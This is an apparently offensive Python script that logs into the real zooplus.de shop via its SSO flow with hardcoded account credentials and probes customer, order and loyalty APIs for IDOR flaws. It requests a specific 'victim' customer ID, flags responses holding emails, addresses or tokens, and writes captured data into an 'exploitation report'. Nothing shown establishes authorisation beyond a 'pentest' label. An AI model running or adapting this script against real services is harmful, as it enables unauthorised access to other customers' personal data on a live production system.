#!/usr/bin/env python3
"""Test endpoints found through browser"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# Test endpoints found in browser
endpoints_to_test = [
    # Customer config - test IDOR
    ("/myaccount/api/customer-config/v1/customerconfiguration/53260509", "GET", None),  # Victim customer ID
    ("/myaccount/api/customer-config/v1/customerconfiguration/1", "GET", None),
    
    # Order details - test IDOR
    ("/myaccount/api/order-details/v3/customer/lastOrders", "GET", None),
    
    # Protected endpoints - test access
    ("/protected/api/loyalty-management/bonus-points/customer/balance", "GET", None),
    ("/protected/api/loyalty-management/memberships/offer", "GET", None),
    ("/protected/api/loyalty-management/memberships/customer/overview", "GET", None),
    
    # Feature flags - test injection
    ("/myaccount/api/order-details/v3/feature-flags", "POST", {"test": "data"}),
]

print("\n[*] Testing browser-found endpoints...")

for endpoint, method, payload in endpoints_to_test:
    try:
        if method == "GET":
            resp = s.get(f"{base}{endpoint}", timeout=5, verify=False)
        else:
            resp = s.request(method, f"{base}{endpoint}", json=payload, timeout=5, verify=False)
        
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
            print(f"  [OK] {method} {endpoint} -> {resp.status_code}")
            
            # Check for sensitive data
            data_str = json.dumps(data) if isinstance(data, dict) else str(data)
            if any(key in data_str.lower() for key in ['password', 'secret', 'key', 'token', 'email', 'address']):
                print(f"      [HIGH] Contains sensitive data!")
                found_vulns.append({"type": "information_disclosure", "severity": "HIGH", "endpoint": endpoint, "data": data_str[:500]})
            
            # Check for IDOR (accessing other user's data)
            if "53260509" in endpoint and "53260633" not in data_str:
                # We're logged in as 53260633, but accessing 53260509's data
                if isinstance(data, dict) and data:
                    print(f"      [CRITICAL] IDOR - accessing other user's data!")
                    found_vulns.append({"type": "idor", "severity": "CRITICAL", "endpoint": endpoint, "data": data_str[:500]})
        elif resp.status_code == 401:
            print(f"  [INFO] {method} {endpoint} -> 401 (requires auth)")
        elif resp.status_code == 403:
            print(f"  [INFO] {method} {endpoint} -> 403 (forbidden)")
    except Exception as e:
        pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    for v in found_vulns:
        print(f"\n[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 УЯЗВИМОСТИ НАЙДЕНЫ ЧЕРЕЗ БРАУЗЕР\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data']}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No vulnerabilities found in browser endpoints")

print("=" * 70)

